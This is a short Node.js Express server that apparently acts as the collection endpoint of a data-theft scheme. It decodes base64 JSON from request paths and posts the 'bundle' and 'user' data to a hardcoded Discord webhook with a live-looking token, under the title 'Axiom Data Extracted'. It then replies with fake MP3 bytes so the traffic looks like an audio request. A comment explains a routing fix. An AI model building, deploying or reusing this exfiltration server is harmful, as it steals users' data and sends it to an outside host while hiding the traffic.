const express = require('express');
const app = express();
const port = 3000;

app.use(express.json());

// REPLACE THIS WITH YOUR DISCORD WEBHOOK URL
const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1501915368002814007/0TgSTuIoLtdQy0h9WK5PwDPk7xIUGkaUPC6yMc-GgP8gdDH6GPKRFHxCI4c1N1-LfY9U';

// --- THE FIX IS HERE ---
// Changed the route path from '/api/*' to '/api/*splat'
// 'splat' is the name we give to the wildcard parameter.
app.get('/api/*splat', async (req, res) => {
  try {
    // The captured wildcard value is now available as req.params.splat
    const base64Payload = req.params.splat;
    
    if (!base64Payload) {
      return res.status(400).send('No payload');
    }
    
    const decoded = Buffer.from(base64Payload, 'base64').toString('utf-8');
    const data = JSON.parse(decoded);
    
    await fetch(DISCORD_WEBHOOK, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        embeds: [{
          title: 'Axiom Data Extracted',
          color: 0xff0000,
          fields: [
            { name: 'Bundle', value: '```' + (data.bundle || 'None') + '```', inline: false },
            { name: 'User Data', value: '```json\n' + JSON.stringify(data.user, null, 2).slice(0, 1000) + '\n```', inline: false }
          ],
          timestamp: new Date().toISOString()
        }]
      })
    });
    
    res.setHeader('Content-Type', 'audio/mpeg');
    res.send(Buffer.from([0xFF, 0xFB, 0x90, 0x44, 0x00]));
    console.log('Data forwarded to Discord:', new Date().toISOString());
    
  } catch (error) {
    console.error('Error:', error);
    res.status(500).send('Error');
  }
});

app.listen(port, () => {
  console.log(`Server running on port ${port}`);
});